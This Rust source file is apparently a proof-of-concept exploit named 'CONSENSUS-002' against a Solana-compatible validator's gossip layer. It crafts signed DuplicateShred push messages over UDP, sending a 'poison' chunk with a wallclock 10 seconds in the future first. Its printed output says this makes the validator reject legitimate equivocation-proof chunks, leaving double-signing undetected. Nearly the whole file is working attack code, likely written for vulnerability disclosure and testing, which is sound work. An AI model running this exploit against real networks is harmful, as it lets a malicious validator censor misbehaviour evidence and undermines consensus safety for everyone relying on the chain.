use anyhow::{Context, Result};
use clap::Parser;
use rand::Rng;
use serde::{Deserialize, Serialize};
use solana_sdk::pubkey::Pubkey;
use solana_sdk::signature::{Keypair, Signer, Signature};
use std::fs;
use std::io::Write as _;
use std::net::{SocketAddr, UdpSocket};
use std::path::PathBuf;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// CONSENSUS-002 PoC: Demonstrate equivocation proof censorship via wallclock manipulation
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Path to fddev log file for analysis
    #[arg(long)]
    analyze_logs: Option<PathBuf>,

    /// Gossip endpoint (default: localhost:8001)
    #[arg(long, default_value = "127.0.0.1:8001")]
    gossip_endpoint: String,

    /// Output directory for generated chunks
    #[arg(long, default_value = "./output")]
    output_dir: PathBuf,

    /// Skip gossip submission (only generate chunks)
    #[arg(long)]
    no_submit: bool,
}

/// DuplicateShred matching Solana's structure exactly
/// From solana-gossip/src/duplicate_shred.rs
#[derive(Clone, Debug, PartialEq, Eq, Deserialize, Serialize)]
struct DuplicateShred {
    from: Pubkey,
    wallclock: u64,
    slot: u64,
    _unused: u32,
    _unused_shred_type: u8,
    num_chunks: u8,
    chunk_index: u8,
    #[serde(with = "serde_bytes")]
    chunk: Vec<u8>,
}

/// CrdsData enum - we only need the DuplicateShred variant
/// Variant discriminant for DuplicateShred is 8 (based on Solana's enum order)
#[derive(Clone, Debug, Serialize, Deserialize)]
enum CrdsData {
    LegacyContactInfo,      // 0
    Vote,                   // 1
    LowestSlot,             // 2
    LegacySnapshotHashes,   // 3
    AccountsHashes,         // 4
    EpochSlots,             // 5
    LegacyVersion,          // 6
    Version,                // 7
    NodeInstance,           // 8
    DuplicateShred(u16, DuplicateShred), // 9
    // More variants exist but we don't need them
}

/// CrdsValue wrapping CrdsData with signature
#[derive(Clone, Debug, Serialize, Deserialize)]
struct CrdsValue {
    signature: Signature,
    data: CrdsData,
}

/// Minimal CrdsFilter stub for Protocol::PullRequest
#[derive(Clone, Debug, Serialize, Deserialize)]
struct CrdsFilter {
    _stub: u8, // Minimal placeholder - we don't use PullRequest
}

/// Protocol enum - must match Solana's variant order exactly
#[derive(Clone, Debug, Serialize, Deserialize)]
enum Protocol {
    PullRequest(CrdsFilter, CrdsValue), // Variant 0
    PullResponse(Pubkey, Vec<CrdsValue>), // Variant 1
    PushMessage(Pubkey, Vec<CrdsValue>), // Variant 2 <- This is what we use!
}

/// Generate fake chunk data
fn generate_chunk_data(size: usize) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut data = vec![0u8; size];
    rng.fill(&mut data[..]);
    data
}

/// Create DuplicateShred chunks for a proof
fn create_proof_chunks(
    slot: u64,
    validator: &Pubkey,
    wallclock: u64,
) -> Result<Vec<CrdsData>> {
    const NUM_CHUNKS: u8 = 3;
    const CHUNK_SIZE: usize = 800;

    let mut chunks = Vec::new();
    for i in 0..NUM_CHUNKS {
        let chunk_data = generate_chunk_data(CHUNK_SIZE);

        let shred = DuplicateShred {
            from: *validator,
            wallclock,
            slot,
            _unused: 0,
            _unused_shred_type: 0,
            num_chunks: NUM_CHUNKS,
            chunk_index: i,
            chunk: chunk_data,
        };

        let chunk = CrdsData::DuplicateShred(i as u16, shred);
        chunks.push(chunk);
    }

    Ok(chunks)
}

/// Gossip client
struct GossipClient {
    socket: UdpSocket,
    keypair: Keypair,
    remote_addr: SocketAddr,
}

impl GossipClient {
    fn new(remote_addr: SocketAddr, keypair: Keypair) -> Result<Self> {
        let socket = UdpSocket::bind("0.0.0.0:0")
            .context("Failed to bind UDP socket")?;

        Ok(Self {
            socket,
            keypair,
            remote_addr,
        })
    }

    fn send_chunk(&self, chunk_data: CrdsData) -> Result<()> {
        // Serialize the data first for signing
        let data_bytes = bincode::serialize(&chunk_data)
            .context("Failed to serialize CrdsData")?;

        // Sign the serialized data
        let signature = self.keypair.sign_message(&data_bytes);

        // Create CrdsValue
        let crds_value = CrdsValue {
            signature,
            data: chunk_data,
        };

        // Wrap in Protocol::PushMessage
        let protocol_msg = Protocol::PushMessage(
            self.keypair.pubkey(),
            vec![crds_value],
        );

        // Serialize the entire message
        let payload = bincode::serialize(&protocol_msg)
            .context("Failed to serialize Protocol message")?;

        // Send via UDP
        self.socket.send_to(&payload, self.remote_addr)
            .context("Failed to send UDP packet")?;

        Ok(())
    }

    fn send_chunks(&self, chunks: &[CrdsData], delay_ms: u64) -> Result<()> {
        for (i, chunk) in chunks.iter().enumerate() {
            let (slot, wallclock, chunk_idx, num_chunks) = match chunk {
                CrdsData::DuplicateShred(_, shred) => {
                    (shred.slot, shred.wallclock, shred.chunk_index, shred.num_chunks)
                }
                _ => (0, 0, 0, 0),
            };

            println!("  📤 Sending chunk {}/{}: slot={}, wallclock={}, index={}/{}",
                i + 1, chunks.len(),
                slot, wallclock,
                chunk_idx, num_chunks - 1);

            self.send_chunk(chunk.clone())?;

            if i < chunks.len() - 1 {
                thread::sleep(Duration::from_millis(delay_ms));
            }
        }

        Ok(())
    }
}

fn write_chunks_to_disk(
    output_dir: &PathBuf,
    slot: u64,
    chunks: &[CrdsData],
    prefix: &str,
) -> Result<()> {
    fs::create_dir_all(output_dir)
        .context("Failed to create output directory")?;

    for (i, chunk) in chunks.iter().enumerate() {
        let filename = if prefix.is_empty() {
            format!("slot{}_chunk{}.bin", slot, i)
        } else {
            format!("slot{}_{}.bin", slot, prefix)
        };

        let path = output_dir.join(&filename);
        let data = bincode::serialize(chunk)
            .context("Failed to serialize chunk")?;

        let mut file = fs::File::create(&path)
            .context("Failed to create chunk file")?;
        file.write_all(&data)
            .context("Failed to write chunk data")?;

        println!("  ✅ Written: {} ({} bytes)", path.display(), data.len());
    }

    Ok(())
}

fn main() -> Result<()> {
    let args = Args::parse();

    if let Some(log_path) = args.analyze_logs {
        println!("Log analysis not yet implemented");
        println!("Requested analysis of: {}", log_path.display());
        return Ok(());
    }

    println!("================================================================================");
    println!("CONSENSUS-002 Proof of Concept");
    println!("Equivocation Proof Censorship via Wallclock Manipulation");
    println!("================================================================================");
    println!();

    // Generate keypair first - we'll use its pubkey as the validator identity
    // This ensures signatures verify correctly
    let keypair = Keypair::new();
    let validator = keypair.pubkey();

    println!("Using validator identity: {}...\n",
        &validator.to_string()[..20]);

    println!("Generating proof chunks...\n");

    // Get current time in milliseconds (Unix epoch)
    let now_ms = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .context("System time before Unix epoch")?
        .as_millis() as u64;

    println!("Current wallclock: {} ms\n", now_ms);

    // Normal wallclock: use current time
    let normal_wallclock = now_ms;

    // Poison wallclock: slightly in the future (still within 15-second window)
    // This will be accepted by CRDS, then later chunks with older wallclock will be rejected
    let poison_wallclock = now_ms + 10_000; // 10 seconds in future

    println!("Slot 100: Normal proof (should assemble but fail validation)");
    let slot100_chunks = create_proof_chunks(100, &validator, normal_wallclock)?;
    write_chunks_to_disk(&args.output_dir, 100, &slot100_chunks, "")?;
    println!();

    println!("Slot 200: Poisoned proof (assembly should be blocked)");
    println!("  Poison wallclock: {} ms ({}ms ahead of legitimate chunks)",
        poison_wallclock, poison_wallclock - normal_wallclock);

    let poison_shred = DuplicateShred {
        from: validator,
        wallclock: poison_wallclock,
        slot: 200,
        _unused: 0,
        _unused_shred_type: 0,
        num_chunks: 3,
        chunk_index: 0,
        chunk: generate_chunk_data(800),
    };
    let poison_chunk = vec![CrdsData::DuplicateShred(0, poison_shred)];
    write_chunks_to_disk(&args.output_dir, 200, &poison_chunk, "poison")?;

    let slot200_chunks = create_proof_chunks(200, &validator, normal_wallclock)?;
    write_chunks_to_disk(&args.output_dir, 200, &slot200_chunks, "")?;
    println!();

    println!("Slot 300: Normal proof (should assemble but fail validation)");
    let slot300_chunks = create_proof_chunks(300, &validator, normal_wallclock)?;
    write_chunks_to_disk(&args.output_dir, 300, &slot300_chunks, "")?;
    println!();

    println!("================================================================================");
    println!("Chunk Generation Complete");
    println!("================================================================================");
    println!();

    if args.no_submit {
        println!("--no-submit flag set, skipping gossip submission.");
        println!("Chunks written to: {}\n", args.output_dir.display());
        return Ok(());
    }

    let gossip_addr: SocketAddr = args.gossip_endpoint.parse()
        .context("Invalid gossip endpoint address")?;

    println!("Connecting to gossip endpoint: {}", gossip_addr);
    let client = GossipClient::new(gossip_addr, keypair)?;
    println!("✅ Gossip client initialized\n");

    const CHUNK_DELAY_MS: u64 = 100;

    println!("📡 Submitting chunks to fddev...\n");

    println!("Slot 100 (normal proof):");
    client.send_chunks(&slot100_chunks, CHUNK_DELAY_MS)?;
    println!();

    thread::sleep(Duration::from_millis(500));

    println!("Slot 200 (POISON FIRST, then legitimate):");
    println!("  🔴 POISON CHUNK:");
    client.send_chunks(&poison_chunk, CHUNK_DELAY_MS)?;

    thread::sleep(Duration::from_millis(200));

    println!("  ⚠️  Legitimate chunks (will be rejected as 'older'):");
    client.send_chunks(&slot200_chunks, CHUNK_DELAY_MS)?;
    println!();

    thread::sleep(Duration::from_millis(500));

    println!("Slot 300 (normal proof):");
    client.send_chunks(&slot300_chunks, CHUNK_DELAY_MS)?;
    println!();

    println!("================================================================================");
    println!("✅ Attack Sequence Complete");
    println!("================================================================================");
    println!();
    println!("Expected behavior:");
    println!("  • Slot 100: Chunks assemble, validation fails (normal)");
    println!("  • Slot 200: Poison accepted, legitimate chunks rejected by CRDS, NO assembly");
    println!("  • Slot 300: Chunks assemble, validation fails (normal)");
    println!();
    println!("Attack mechanism:");
    println!("  1. Poison chunk has wallclock={}ms (10s in future)", poison_wallclock);
    println!("  2. Legitimate chunks have wallclock={}ms (current time)", normal_wallclock);
    println!("  3. CRDS accepts poison first, then rejects older legitimate chunks");
    println!("  4. Slot 200 proof never assembles, equivocation goes undetected");
    println!();
    println!("Check fddev logs for evidence of the attack.");
    println!();

    Ok(())
}
